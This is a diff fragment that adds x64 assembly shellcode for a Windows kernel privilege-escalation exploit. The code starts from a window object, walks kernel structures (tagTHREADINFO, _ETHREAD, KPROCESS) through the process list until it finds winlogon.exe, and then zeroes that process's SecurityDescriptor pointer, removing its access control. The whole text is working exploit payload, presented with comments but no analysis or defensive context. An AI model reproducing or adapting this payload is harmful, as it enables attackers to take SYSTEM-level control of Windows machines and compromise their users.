@@ -1,0 +1,13 @@
+mov rax, WND
+mov rax, [rax+10h] //pointer to tagTHREADINFO structure
+mov rax, [rax] //pointer to _ETHREAD structure
+mov rax, [rax+220h] //pointer to KPROCESS structure
+mov rax, [rax+2e8h] //pointer to next KPROCESS in linked list
+procloop:
+lea rbx, [rax-2e8h] //Look at current KPROCESS
+mov rax, [rax] //Get the next KPROCESS
+add rbx,438h //ASCII name of the process
+cmp dword ptr [rbx], 6c6e6977h //translates to winl for winlogon.exe
+jne procloop //jump unless current process is winlogon.exe
+sub rbx, 440h //SecurityDescriptor is 0x8 bytes before the KPROCESS
+mov qword ptr [rbx], 0h //null the SecurityDescriptor pointer, effectely NULL'ing the ACL
